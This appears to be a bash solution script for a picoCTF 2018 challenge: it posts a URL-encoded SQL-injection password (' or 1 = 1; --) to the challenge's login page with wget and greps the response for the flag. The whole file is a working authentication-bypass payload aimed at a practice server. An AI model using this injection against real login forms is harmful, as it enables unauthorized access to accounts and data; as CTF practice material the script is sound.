#!/bin/bash

wget -q --post-data "username=admin&password=%27+or+1+%3D+1%3B+--&debug=0" http://2018shell.picoctf.com:52135/login.php
grep -o -E "picoCTF\{[a-zA-Z0-9_]*\}" login.php
